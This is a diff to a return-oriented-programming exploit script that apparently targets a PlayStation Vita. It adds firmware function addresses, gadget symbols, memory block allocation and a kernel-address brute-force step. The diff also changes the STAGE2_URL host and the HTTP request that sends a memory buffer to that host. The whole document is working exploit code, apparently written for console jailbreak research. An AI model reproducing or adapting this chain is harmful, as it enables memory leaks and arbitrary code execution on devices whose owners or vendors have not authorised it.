@@ -10,27 +10,40 @@ data
     func sceHttpCreateRequestWithURL = 0x89ED857C;
     func sceHttpSendRequest = 0x89ED853C;
     func sceHttpReadData = 0x89ED851C;
+    func sceKernelAllocMemBlock = 0xE000B0BC;
+    func sceKernelGetMemBlockBase = 0xE000B0AC;
+
+    func memset = 0x810E20E1;
 
     symbol LDM_ADDR = 0x81204000;
     symbol LDM_ADDR_SP = 0x8120400C;
     symbol LDM_ADDR_PC = 0x81204010;
-    symbol STAGE2_URL = %(writes("http://192.168.109.104:8080/"))s;
+    symbol STAGE2_URL = %(writes("http://192.168.2.1:8080/"))s;
     symbol HTTP_HANDLE = %(writes("AAAAAAAA"))s;
     symbol POP_GADGET = 0x89C004A7;
 
     symbol HTTPBUF_ADDR = 0x8120C000;
+    symbol MEMBLOCK_BASE = 0x8120D000;
+    symbol ENCDEC_SCRATCH = 0x81210000;
 }
 
 code : entry
 {
     $writedata$
 
-    svc(0x2c0);
+    sceKernelAllocMemBlock(%(writes(""))s, 0x0c20d060, 0x10000, 0);
+    sceKernelGetMemBlockBase(RET, MEMBLOCK_BASE);
+    loadret(MEMBLOCK_BASE);
     storeret(HTTPBUF_ADDR);
-    store(0x41414141, HTTPBUF_ADDR+4);
+
+    %(bruteforce_kx())s
+
+    // svc(0x2c0);
+    // storeret(HTTPBUF_ADDR);
+    // store(0x41414141, HTTPBUF_ADDR+4);
 
     sceHttpCreateTemplate(
-        %(writes(""))s /*useragent*/,
+        %(writes("aaa"))s /*useragent*/,
         2 /*http_ver*/,
         1 /*auto_proxy*/);
 
@@ -39,7 +52,7 @@ code : entry
     storeret(HTTP_HANDLE);
 
     loadret(HTTP_HANDLE);
-    sceHttpSendRequest(RET, 0xE0000000, 0x10000);
+    sceHttpSendRequest(RET, HTTPBUF_ADDR, 0x100);
 
     infloop(0);
 }
